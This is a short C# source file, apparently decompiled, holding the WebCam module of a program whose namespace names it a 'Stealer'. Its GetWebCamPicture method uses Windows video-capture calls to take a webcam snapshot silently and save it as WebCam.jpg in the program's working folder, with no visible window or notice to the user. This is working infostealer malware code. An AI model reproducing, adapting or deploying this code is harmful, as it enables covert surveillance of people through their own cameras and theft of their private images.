using System;
using System.Runtime.InteropServices;

namespace Stealer.modules
{
	// Token: 0x0200003C RID: 60
	internal class WebCam
	{
		// Token: 0x06000140 RID: 320
		[DllImport("avicap32.dll")]
		public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

		// Token: 0x06000141 RID: 321
		[DllImport("user32")]
		public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

		// Token: 0x06000142 RID: 322 RVA: 0x0000E074 File Offset: 0x0000C274
		internal static void GetWebCamPicture()
		{
			string path = Program.path;
			IntPtr intPtr = Marshal.StringToHGlobalAnsi(path + "\\WebCam.jpg");
			IntPtr hWnd = WebCam.capCreateCaptureWindowA("VFW Capture", -1073741824, 0, 0, 640, 480, 0, 0);
			WebCam.SendMessage(hWnd, 1034U, 0, 0);
			WebCam.SendMessage(hWnd, 1034U, 0, 0);
			WebCam.SendMessage(hWnd, 1049U, 0, intPtr.ToInt32());
			WebCam.SendMessage(hWnd, 1035U, 0, 0);
			WebCam.SendMessage(hWnd, 16U, 0, 0);
		}

		// Token: 0x04000090 RID: 144
		private const int WM_CAP_DRIVER_CONNECT = 1034;

		// Token: 0x04000091 RID: 145
		private const int WM_CAP_DRIVER_DISCONNECT = 1035;

		// Token: 0x04000092 RID: 146
		private const int WS_CHILD = 1073741824;

		// Token: 0x04000093 RID: 147
		private const int WS_POPUP = -2147483648;

		// Token: 0x04000094 RID: 148
		private const int WM_CAP_SAVEDIB = 1049;

		// Token: 0x04000095 RID: 149
		private const int WM_CLOSE = 16;
	}
}
